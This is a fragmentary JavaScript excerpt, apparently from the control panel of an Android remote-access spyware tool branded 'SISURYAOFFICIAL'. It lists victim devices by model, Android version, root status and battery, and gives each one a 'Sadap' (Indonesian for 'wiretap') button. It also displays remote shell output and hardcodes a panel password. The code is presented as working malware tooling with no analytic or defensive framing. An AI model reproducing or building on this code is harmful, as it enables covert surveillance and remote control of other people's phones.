...
var o="hiddenser";
var database = firebase.database();
localStorage.setItem("SISURYAOFFICIALpass",o);
...
uo2.innerHTML+='<br><div class="usr" >'+model+' <span style="float:right" >'+aversion+'</span><br><br>Rooted: '+ip+' <span style="float:right" >Battery: '+battery+' </span><br><br><center><button onclick="setdev('+"'"+uid+"'"+')">Sadap</button></center></div> '; 
}
}
else{
uo2.innerHTML="Tidak Ada Perangkat Online/Masuk";
}
});
}
userss();
...
$("#shellcmd").css("display","block");
$("#shelldata").html("SISURYAOFFICIAL Shell<br><br>"+o.replaceAll("\n","<br>"))
